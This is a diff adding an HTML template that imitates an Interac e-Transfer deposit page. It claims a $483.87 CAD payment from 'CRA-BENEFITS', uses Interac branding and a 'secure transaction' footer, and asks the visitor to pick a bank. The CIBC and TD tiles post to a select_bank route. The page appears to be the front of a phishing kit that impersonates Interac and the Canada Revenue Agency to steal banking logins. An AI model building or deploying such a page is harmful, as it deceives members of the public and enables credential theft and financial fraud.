@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Deposit Your Money</title>
+  <!-- Keep your same reference to landing.css -->
+  <link rel="stylesheet" href="{{ url_for('static', filename='landing.css') }}">
+
+  <style>
+    /* 1) .bank-section now left-aligned, matching .content’s layout */
+    .bank-section {
+      max-width: 1000px;   /* same width as .content */
+      margin: 20px auto;   /* center the section horizontally */
+      text-align: left;    /* left-align the heading */
+      position: relative;  
+    }
+
+    /* 2) The row that holds the heading on left and search on right */
+    .bank-section-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between; 
+      margin-bottom: 10px;
+    }
+
+    .bank-section-header h2 {
+      margin: 0; 
+      font-size: 1.2rem;
+    }
+
+    /* 3) The small, round search input + button on the right */
+    .search-container {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+    .search-container input {
+      width: 100px;        
+      height: 30px;
+      padding: 0 8px;      
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 0.9rem;
+    }
+    .search-container button {
+      width: 36px;
+      height: 36px;
+      border: none;
+      border-radius: 50%;
+      background-color: #ffc107;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1rem;
+    }
+
+    /* 4) Some spacing between the heading/search row and the bank grid */
+    .bank-grid {
+      margin-top: 15px;
+    }
+
+    /* 5) Hide .content-right (“Expires/Reference”) on mobile only */
+    @media screen and (max-width: 768px) {
+      .content-right {
+        display: none !important;
+      }
+      /* On mobile, stack heading and search container */
+      .bank-section-header {
+        flex-direction: column;
+        align-items: flex-start;
+        gap: 10px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- Header -->
+  <header class="header">
+    <div class="header-left">
+      <img src="/static/images/interac-logo.png" alt="Interac Logo" class="logo">
+      <span class="down-arrow"></span>
+      <span class="header-title"></span>
+    </div>
+    <div class="header-right">
+      <a href="#" class="contact-link">Contact Us</a>
+      <a href="#" class="about-link">About</a>
+      <a href="#" class="fr-link">FRANÇAIS</a>
+      <div class="help-icon">?</div>
+      <div class="hamburger-icon" onclick="toggleHamburger()">&#9776;</div>
+      <div class="hamburger-dropdown" id="hamburgerDropdown" style="display: none;">
+        <a href="#">Contact Us</a>
+        <a href="#">About</a>
+      </div>
+    </div>
+  </header>
+  
+  <!-- Content Area -->
+  <div class="content">
+    <div class="content-left">
+      <h1>Deposit Your Money</h1>
+      <p class="amount"><strong>$483.87 CAD</strong></p>
+      <p class="from-info">From : CRA-BENEFITS</p>
+    </div>
+
+    <!-- Vertical Divider -->
+    <div class="vertical-divider"></div>
+
+    <!-- Desktop View Only -->
+    <div class="content-right">
+      <p>Expires: <strong>February 16, 2025</strong></p>
+      <p>Reference #: <strong>CAASEpeR</strong></p>
+    </div>
+
+    <!-- Mobile-Only "View Transfer Details" -->
+    <div class="dropdown-container">
+      <div class="divider"></div>
+      <div class="dropdown-trigger" onclick="toggleDetails()">
+        View Transfer Details <span>➔</span>
+      </div>
+      <div class="dropdown-content" id="details-dropdown" style="display: none;">
+        <p>Expires: <strong>February 16, 2025</strong></p>
+        <p>Reference #: <strong>CAASEpeR</strong></p>
+      </div>
+      <div class="divider"></div>
+    </div>
+  </div>
+
+  <!-- Divider After the Content -->
+  <div class="divider"></div>
+
+  <!-- Bank Section -->
+  <section class="bank-section">
+    <!-- A row with heading on left + search on right -->
+    <div class="bank-section-header">
+      <h2>Select Your Financial Institution</h2>
+      <div class="search-container">
+        <input type="text" placeholder="Search"/>
+        <button class="search-btn">🔍</button>
+      </div>
+    </div>
+    <!-- The bank grid below -->
+    <div class="bank-grid">
+      <div class="bank-box">
+        <img src="/static/images/bank-atb.png" alt="ATB Financial">
+      </div>
+      <div class="bank-box">
+        <img src="/static/images/bank-bmo.png" alt="BMO">
+      </div>
+      <!-- CIBC (3rd) -->
+      <form action="{{ url_for('select_bank') }}" method="POST" class="bank-box" style="margin:0;padding:0;border:none;">
+        <input type="hidden" name="bank" value="CIBC">
+        <button type="submit" style="all:unset;display:flex;justify-content:center;align-items:center;width:100%;height:100%;">
+          <img src="/static/images/bank-cibc.png" alt="CIBC">
+        </button>
+      </form>
+      <div class="bank-box">
+        <img src="/static/images/bank-coast.png" alt="coastcapital">
+      </div>
+      <div class="bank-box">
+        <img src="/static/images/bank-desjardins.png" alt="Desjardins">
+      </div>
+      <div class="bank-box">
+        <img src="/static/images/bank-laurentian.png" alt="Laurentian Bank">
+      </div>
+      <div class="bank-box">
+        <img src="/static/images/bank-manulife.png" alt="Manulife">
+      </div>
+      <div class="bank-box">
+        <img src="/static/images/bank-meridian.png" alt="Meridian">
+      </div>
+      <div class="bank-box">
+        <img src="/static/images/bank-motus.png" alt="Motusbank">
+      </div>
+      <div class="bank-box">
+        <img src="/static/images/bank-national.png" alt="National Bank">
+      </div>
+      <div class="bank-box">
+        <img src="/static/images/bank-financial.png" alt="Financial">
+      </div>
+      <div class="bank-box">
+        <img src="/static/images/bank-peoples.png" alt="Peoples Trust">
+      </div>
+      <div class="bank-box">
+        <img src="/static/images/bank-rbc.png" alt="RBC">
+      </div>
+      <div class="bank-box">
+        <img src="/static/images/bank-scotiabank.png" alt="Scotiabank">
+      </div>
+      <div class="bank-box">
+        <img src="/static/images/bank-simplii.png" alt="Simplii Financial">
+      </div>
+      <div class="bank-box">
+        <img src="/static/images/bank-tangerine.png" alt="Tangerine">
+      </div>
+      <!-- NEW: TD button post to /select-bank just like CIBC -->
+      <form action="{{ url_for('select_bank') }}" method="POST" class="bank-box" style="margin:0;padding:0;border:none;">
+        <input type="hidden" name="bank" value="TD">
+        <button type="submit" style="all:unset;display:flex;justify-content:center;align-items:center;width:100%;height:100%;">
+          <img src="/static/images/bank-td.png" alt="TD">
+        </button>
+      </form>
+    </div>
+  </section>
+
+  <hr>
+
+  <!-- Dropdown Section -->
+  <section class="dropdown-section">
+    <h2>Select Financial Institution or Province/Territory and Credit Union</h2>
+    <div class="dropdowns">
+      <div>
+        <label for="financial-institution">Select Your Financial Institution</label>
+        <select id="financial-institution">
+          <option>Select institution</option>
+        </select>
+      </div>
+      <div>
+        <label for="province">Select Province or Territory</label>
+        <select id="province">
+          <option>Select Province or Territory</option>
+        </select>
+      </div>
+      <div>
+        <label for="credit-union">Select Credit Union</label>
+        <select id="credit-union" disabled>
+          <option>Select Credit Union</option>
+        </select>
+      </div>
+    </div>
+    <button class="deposit-btn">Deposit &gt;</button>
+  </section>
+
+  <!-- Footer -->
+  <footer class="footer">
+    <p>Interac e-Transfer | Privacy Policy | Security</p>
+    <p>This is a secure transaction</p>
+    <p>© 2025 Interac Corp. All rights reserved.</p>
+  </footer>
+
+  <script>
+    function toggleDetails() {
+      const dropdown = document.getElementById("details-dropdown");
+      const trigger = document.querySelector(".dropdown-trigger span");
+      if (dropdown.style.display === "none" || dropdown.style.display === "") {
+        dropdown.style.display = "block";
+        trigger.style.transform = "rotate(90deg)";
+      } else {
+        dropdown.style.display = "none";
+        trigger.style.transform = "rotate(0deg)";
+      }
+    }
+    function toggleHamburger() {
+      const menu = document.getElementById('hamburgerDropdown');
+      if (menu.style.display === 'none' || menu.style.display === '') {
+        menu.style.display = 'block';
+      } else {
+        menu.style.display = 'none';
+      }
+    }
+  </script>
+</body>
+</html>
